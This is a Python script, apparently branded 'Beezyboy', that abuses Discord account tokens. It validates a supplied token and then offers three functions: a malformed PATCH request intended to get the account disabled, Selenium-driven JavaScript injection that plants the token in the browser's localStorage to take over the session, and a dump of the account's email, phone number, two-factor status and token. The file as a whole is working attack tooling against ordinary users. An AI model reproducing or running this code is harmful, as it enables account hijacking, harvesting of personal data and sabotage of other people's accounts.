import discord
import asyncio
import codecs
import sys
import io
import random
import threading
import requests
import discord
import os
from discord.ext import commands
from discord.ext.commands import Bot

import pyfiglet
from pyfiglet import Figlet

from colorama import Fore, init
from selenium import webdriver
from datetime import datetime
from itertools import cycle

init(convert=True)
clear = lambda: os.system('clear')
clear()

bot = commands.Bot(command_prefix='-', self_bot=True)
bot.remove_command("help")

custom_fig = Figlet(font='graffiti')
print(custom_fig.renderText('Beezyboy'))

#token login

print('\n')
token = input("Token : ")

head = {'Authorization': str(token)}
src = requests.get('https://discordapp.com/api/v6/users/@me', headers=head)

if src.status_code == 200:
    print('[+] Account valid ')
    input("Press any key to continue...")
else:
    print(f'[{Fore.RED}-{Fore.RESET}] Invalid token')
    input("Press any key to exit...")
    exit(0)

#title screen

print('\n')
print('1 - DISABLE TOKEN')
print('2 - LOGIN WITH A TOKEN (only for pc)')
print('3 - GRAP TOKEN INFO')
print('\n')

def tokenDisable(token):
    print('STATUS : [DISABLING TOKEN]')
    r = requests.patch('https://discordapp.com/api/v6/users/@me', headers={'Authorization': token})
    if r.status_code == 400:
        print(f'[{Fore.RED}+{Fore.RESET}] Account disabled successfully')
        input("Press any key to exit...")
    else:
        print(f'[{Fore.RED}-{Fore.RESET}] Invalid token')
        input("Press any key to exit...")

def tokenLogin(token):
    print('STATUS : [LOGIN WITH TOKEN]')
    opts = webdriver.ChromeOptions()
    opts.add_experimental_option("detach", True)
    driver = webdriver.Chrome('chromedriver.exe', options=opts)
    script = """
            function login(token) {
            setInterval(() => {
            document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`
            }, 50);
            setTimeout(() => {
            location.reload();
            }, 2500);
            }
            """
    driver.get("https://discord.com/login")
    driver.execute_script(script + f'\nlogin("{token}")')

def tokenInfo(token):
    print('STATUS : [TOKEN INFO]')
    headers = {'Authorization': token, 'Content-Type': 'application/json'}  
    r = requests.get('https://discord.com/api/v6/users/@me', headers=headers)
    if r.status_code == 200:
            userName = r.json()['username'] + '#' + r.json()['discriminator']
            userID = r.json()['id']
            phone = r.json()['phone']
            email = r.json()['email']
            mfa = r.json()['mfa_enabled']
            print(f'''
            [{Fore.RED}User ID{Fore.RESET}]         {userID}
            [{Fore.RED}User Name{Fore.RESET}]       {userName}
            [{Fore.RED}2 Factor{Fore.RESET}]        {mfa}
            [{Fore.RED}Email{Fore.RESET}]           {email}
            [{Fore.RED}Phone number{Fore.RESET}]    {phone if phone else ""}
            [{Fore.RED}Token{Fore.RESET}]           {token}
            ''')
            input()

def mainanswer():
    answer = input('Choose : ')
    if answer == '1':
        tokenDisable(token)
    elif answer == '2':
        tokenLogin(token)
    elif answer == '3':
        tokenInfo(token)
    else:
        print('wrong input, please choose a number')
        mainanswer()

mainanswer()